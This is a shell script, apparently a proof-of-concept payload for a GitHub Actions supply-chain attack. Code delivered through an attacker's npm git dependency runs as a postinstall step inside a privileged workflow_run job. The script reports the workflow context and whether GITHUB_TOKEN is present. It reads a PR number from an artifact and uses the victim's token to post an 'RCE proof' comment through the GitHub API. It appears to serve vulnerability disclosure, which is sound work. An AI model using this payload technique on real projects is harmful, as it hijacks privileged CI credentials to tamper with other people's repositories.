#!/bin/sh
echo "=========== DEP CODE EXEC BEGIN ==========="
echo "cwd: $(pwd)"
echo "EVENT=$GITHUB_EVENT_NAME JOB=$GITHUB_JOB REPO=$GITHUB_REPOSITORY"
[ -n "$GITHUB_TOKEN" ] && echo "GITHUB_TOKEN present (len ${#GITHUB_TOKEN})" || echo "GITHUB_TOKEN absent"
PR=$(cat ../../pr-number.txt 2>/dev/null | tr -d '\n')
echo "PR from artifact: [$PR]"
curl -sS --max-time 20 -o /tmp/depc.json -w "COMMENT-HTTP=%{http_code}\n" -X POST \
  -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" -H "Content-Type: application/json" \
  -d '{"body":"**RCE proof (dependency lifecycle)** - attacker npm git dependency executed a postinstall script inside the privileged workflow_run job."}' \
  "https://api.github.com/repos/$GITHUB_REPOSITORY/issues/$PR/comments"
echo "=========== DEP CODE EXEC END ==========="
